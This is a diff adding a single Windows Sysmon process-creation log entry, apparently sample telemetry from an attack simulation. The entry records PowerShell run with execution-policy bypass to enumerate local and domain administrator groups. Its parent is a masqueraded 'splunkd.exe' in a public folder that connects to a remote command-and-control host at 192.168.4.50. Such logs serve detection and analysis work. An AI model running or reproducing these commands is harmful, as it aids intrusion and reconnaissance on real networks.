@@ -1,0 +1,24 @@
+Process Create:
+RuleName: -
+UtcTime: 2024-03-12 19:27:40.991
+ProcessGuid: {9e93975c-acac-65f0-af02-000000001000}
+ProcessId: 1136
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -ExecutionPolicy Bypass -C "net localgroup administrators && net group /domain \"Domain Admins\""
+CurrentDirectory: C:\Windows\system32\
+User: DESKTOP-PI4K20B\chand
+LogonGuid: {9e93975c-9cf3-65f0-aea1-040000000000}
+LogonId: 0x4A1AE
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3
+ParentProcessGuid: {9e93975c-ab14-65f0-7a02-000000001000}
+ParentProcessId: 8856
+ParentImage: C:\Users\Public\splunkd.exe
+ParentCommandLine: "C:\Users\Public\splunkd.exe" -socket 192.168.4.50:7010 -http http://192.168.4.50:8888 -contact tcp 
+ParentUser: DESKTOP-PI4K20B\chand
